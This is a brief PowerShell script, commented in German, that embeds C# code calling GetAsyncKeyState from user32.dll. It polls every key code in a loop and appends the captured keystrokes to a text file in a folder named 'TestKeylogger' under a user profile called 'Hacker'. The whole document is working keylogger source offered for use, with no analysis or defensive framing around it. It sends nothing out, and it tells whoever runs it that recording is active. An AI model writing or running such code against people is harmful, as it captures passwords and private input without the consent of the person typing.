# Importieren der benötigten .NET-Klassen
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class KeyboardListener {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    public static string Listen() {
        string keys = "";
        for (int i = 0; i < 255; i++) {
            int keyState = GetAsyncKeyState(i);
            if (keyState == 1 || keyState == -32767) {
                keys += ((ConsoleKey)i).ToString() + " ";
            }
        }
        return keys;
    }
}
"@

# Hauptlogik
$logFile = "C:\Users\Hacker\Desktop\TestKeylogger\tastatureingaben.txt"
Write-Host "Tastatureingaben werden aufgezeichnet. Drücken Sie STRG+C, um zu beenden."

while ($true) {
    Start-Sleep -Milliseconds 100
    $keys = [KeyboardListener]::Listen()
    if ($keys -ne "") {
        Add-Content -Path $logFile -Value $keys
    }
}
